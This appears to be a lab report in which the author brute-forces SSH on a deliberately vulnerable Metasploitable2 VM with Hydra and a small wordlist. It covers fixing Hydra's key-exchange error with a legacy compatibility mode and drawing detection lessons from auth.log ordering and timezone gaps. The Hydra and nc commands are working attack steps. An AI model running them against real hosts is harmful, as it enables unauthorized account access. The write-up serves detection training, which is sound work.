# SOC Detection Lab — Attack 2: SSH Credential Brute Force

## Overview

Second attack in the "Catch the Attacker" project — playing both attacker and defender against a deliberately vulnerable Metasploitable2 target from Kali Linux. This report documents a credential-based attack against SSH (rather than the unauthenticated service exposure in Attack 1), the evidence captured, a tooling compatibility issue and its fix, and two detection-analysis findings that came out of correlating the attack and target logs.

---

## Attack Chain Summary

| Step | Action | MITRE ATT&CK Mapping |
|---|---|---|
| 1 | Confirmed target reachability and SSH port state | **T1046** — Network Service Discovery |
| 2 | Built a targeted credential wordlist | Preparation — not independently mapped |
| 3 | Credential brute force via Hydra | **T1110.001** — Brute Force: Password Guessing |
| 4 | Manual login with recovered credential | **T1021.004** — Remote Services: SSH |

---

## Step 1: Reconnaissance — Confirming the Target

**Commands:**
```bash
ping 192.168.56.101
nc -zv 192.168.56.101 22
```

**Result:**
```
4 packets transmitted, 4 received, 0% packet loss, time 3038ms
rtt min/avg/max/mdev = 1.370/2.101/2.834/0.526 ms

192.168.56.101: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.56.101] 22 (ssh) open
```

Target is reachable and port 22 is confirmed open before committing to an attack against it — same discipline as the Nmap step in Attack 1, just against a single known port rather than a full scan.

---

## Step 2: Building the Wordlist

Rather than running a full dictionary (e.g. rockyou.txt) — which produces a slow, noisy run with no analytical benefit for this exercise — a small, deliberate wordlist (`secrets.txt`) was built, mixing the known Metasploitable2 default credential with a handful of personal-name-based guesses:

```
rooot
toor
takunda
tapiwa
mfsadmin
hoyoo
double down
mmsfadmin
msfadmin
tinaye
```

This mirrors a real-world password-spray wordlist strategy: attackers commonly enrich generic credential lists with names, keyboard patterns, and organization-specific terms rather than relying on raw dictionary volume alone.

---

## Step 3: Tooling Issue — SSH Key Exchange Incompatibility

**Initial command:**
```bash
hydra -l msfadmin -P secrets.txt ssh://192.168.56.101
```

**Result:**
```
[ERROR] could not connect to ssh://192.168.56.101:22/ - kex error : no match for method mac algo client->server: server [hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-sha1-96,hmac-md5-96], client [hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512]
```

**Root cause:** Hydra's SSH module runs on libssh, which by default only offers modern MAC/key-exchange algorithms. Metasploitable2's SSH server dates to ~2010 and only supports legacy algorithms (`hmac-md5`, `hmac-sha1`, etc.), which modern libssh refuses to negotiate with by default since they're considered cryptographically weak. The two sides had no overlapping algorithm to agree on.

**Fix:** Kali ships a compatibility toggle for exactly this scenario. Enabling **SSH Wide Compatibility Mode** (`kali-tweaks` → Metapackages/Compatibility, previously unchecked) re-enables legacy algorithm support system-wide for connecting to older targets like Metasploitable2.

This is a genuine attacker-side constraint worth noting: modern offensive tooling is often *too* secure-by-default to talk to intentionally outdated targets, and attacking older infrastructure sometimes requires deliberately downgrading your own tooling's security posture.

---

## Step 4: Credential Brute Force

**Command (after enabling Wide Compatibility Mode):**
```bash
hydra -l msfadmin -P secrets.txt ssh://192.168.56.101
```

**Result:**
```
[22][ssh] host: 192.168.56.101   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
```

Valid credential recovered on the first completed run: `msfadmin:msfadmin`.

---

## Step 5: Manual Verification

Logged in directly with the recovered credential to confirm access, rather than trusting Hydra's output alone:
```bash
ssh msfadmin@192.168.56.101
```
Access confirmed.

---

## Evidence — auth.log on Metasploitable2

**Command:**
```bash
grep -E "Accepted|Failed" /var/log/auth.log
```

**Result (chronological):**
```
Sep 23 01:54:48 metasploitable sshd[4797]: Accepted password for msfadmin from 192.168.56.105 port 53086 ssh2
Sep 23 01:54:48 metasploitable sshd[4804]: Failed password for msfadmin from 192.168.56.105 port 53116 ssh2
Sep 23 01:54:50 metasploitable sshd[4789]: Failed password for msfadmin from 192.168.56.105 port 53030 ssh2
Sep 23 01:54:50 metasploitable sshd[4791]: Failed password for msfadmin from 192.168.56.105 port 53040 ssh2
Sep 23 01:54:50 metasploitable sshd[4793]: Failed password for msfadmin from 192.168.56.105 port 53060 ssh2
Sep 23 01:54:51 metasploitable sshd[4794]: Failed password for msfadmin from 192.168.56.105 port 53066 ssh2
Sep 23 01:54:51 metasploitable sshd[4800]: Failed password for msfadmin from 192.168.56.105 port 53102 ssh2
Sep 23 01:54:51 metasploitable sshd[4795]: Failed password for msfadmin from 192.168.56.105 port 53074 ssh2
Sep 23 01:54:51 metasploitable sshd[4792]: Failed password for msfadmin from 192.168.56.105 port 53046 ssh2
Sep 23 01:54:51 metasploitable sshd[4806]: Failed password for msfadmin from 192.168.56.105 port 53128 ssh2
```

---

## Detection Finding #1: Attack Ordering Under Parallel Execution

**Initial expectation:** a brute force should show a run of "Failed password" lines followed by one final "Accepted password" line — failures, then success, in that order.

**What the log actually shows:** the "Accepted" line is timestamped *before* several "Failed" lines.

**Explanation:** Hydra runs multiple threads in parallel (`-t 4` default, as flagged in its own startup warning) — it tests several candidate passwords from the wordlist simultaneously rather than strictly one at a time. Since `msfadmin` happened to be dispatched early, its thread could return success while other threads were still working through — and failing on — their own assigned candidates.

**Why this matters for detection:** a naive detection rule that assumes strict "N failures, then 1 success, in sequence" will misread or miss a real parallelized brute force. A correct rule instead keys on **volume of failed attempts plus at least one success, from the same source IP, within a tight time window** — regardless of the exact order events arrive in the log. This is a more accurate and more realistic detection logic than sequence-based pattern matching.

---

## Detection Finding #2: Cross-System Timestamp Correlation

**Observation:** Hydra's own output (run on Kali) reported completion at `00:54:49`. The corresponding `auth.log` entries (on Metasploitable2) are timestamped `01:54:48`–`01:54:51` — an apparent 1-hour discrepancy between the attacker-side and target-side timestamps for the same events.

**Initial assumption:** likely just a timezone difference between the two VMs.

**Verification (not just assumption) — since `timedatectl` isn't available on Metasploitable2's pre-systemd base:**
```bash
# Kali
date -u
# → Wed Sep 23 06:17:42 AM UTC 2026

# Metasploitable2
date -u
# → Wed Sep 23 06:17:23 UTC 2026
```

UTC times on both hosts matched within 19 seconds — confirming the underlying system clocks were effectively synced. The 1-hour gap was entirely a **local timezone display difference** (Kali set to America/Chicago/CDT, UTC-5; Metasploitable2 set to EDT, UTC-4), not clock drift.

**Why this matters for detection:** this reflects a real SOC practice — timestamps from different systems must be normalized to UTC before correlating events across hosts. Comparing local times directly (as the raw Hydra output vs. raw auth.log appeared to show) can make an analyst misjudge the actual sequence or duration of an attack. Confirming this via `date -u` on both hosts, rather than assuming the timezone explanation without checking, also ruled out the more serious possibility of genuine clock drift, which would itself be a finding worth escalating (unsynced clocks undermine log correlation reliability across an environment).

---

## MITRE ATT&CK Mapping

| Technique | ID | Notes |
|---|---|---|
| Network Service Discovery | T1046 | Confirming port 22 open before attacking it |
| Brute Force: Password Guessing | T1110.001 | Hydra credential attack against SSH |
| Remote Services: SSH | T1021.004 | Manual login using the recovered credential |

---

## Lab Evidence Captured
- Terminal output confirming target reachability and open port (ping, nc)
- Wordlist (`secrets.txt`) used for the credential attack
- Hydra kex-error output and the Wide Compatibility Mode fix
- Hydra successful run output (`msfadmin:msfadmin`)
- `auth.log` entries for both failed and accepted authentication attempts
- `date -u` output from both Kali and Metasploitable2, used to verify timestamp correlation

---

## Next Steps
- **Attack 3:** FTP backdoor exploitation (vsftpd 2.3.4) — known CVE exploitation
- Apply the UTC-normalization habit from this attack going forward — check both hosts' actual clocks before drawing conclusions from timestamp gaps, rather than assuming a timezone explanation
- Eventual goal: write basic Sigma detection rules for both the port-scan pattern (Attack 1) and the brute-force pattern (this attack) identified across the lab so far
